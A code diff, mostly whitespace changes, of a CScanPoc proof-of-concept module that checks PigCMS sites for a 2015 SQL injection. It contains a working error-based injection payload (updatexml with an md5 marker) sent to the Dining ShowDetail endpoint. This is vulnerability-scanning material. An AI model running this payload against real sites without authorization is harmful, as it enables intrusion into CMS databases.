@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PigCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'PigCMS_0001'  # 平台漏洞编号，留空
     name = 'PigCMS SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-12-16'  # 漏洞公布时间
     desc = '''
         PigCms（又称小猪CMS）是一个基于php+mysql的多用户微信营销源码程序，由合肥彼岸互联信息技术有限公司开发，是国内使用最多、功能最强大、性能最稳定的多用户微信营销系统平台源码,目前国内大多数微信营销平台都是pigcms或由pigcms二次开发而成。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PigCMS(小猪CMS)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'c2e8c527-b737-453a-9197-fe539e413c62'
@@ -33,7 +35,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/index.php?g=Wap&m=Dining&a=ShowDetail&id=2%20and%20updatexml(1,concat(0x7e,(md5(c))),0)%23'
             url = self.target + payload
             r = requests.get(url)
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
